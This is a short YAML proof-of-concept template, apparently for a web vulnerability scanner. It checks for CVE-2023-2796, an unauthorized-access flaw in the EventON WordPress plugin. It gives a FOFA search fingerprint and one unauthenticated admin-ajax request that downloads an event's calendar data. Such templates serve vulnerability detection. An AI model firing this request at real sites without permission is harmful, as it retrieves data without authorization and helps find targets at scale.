id: poc-yaml-eventon-unauthorized-access
info:
  name: EventON 未授权访问漏洞(CVE-2023-2796)
  severity: medium
  tags:
  - CVE-2023-2796
  - 未授权访问
  finger: EventON
  fofa: wp-content/plugins/eventon/
requests:
- method: GET
  path: /wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1
  expression: 'status_code == 200

    && contains(body,"BEGIN:VCALENDAR")

    && contains(body,"END:VCALENDAR")

    && contains(headers,"text/calendar")

    '
variables: {}
transport: http
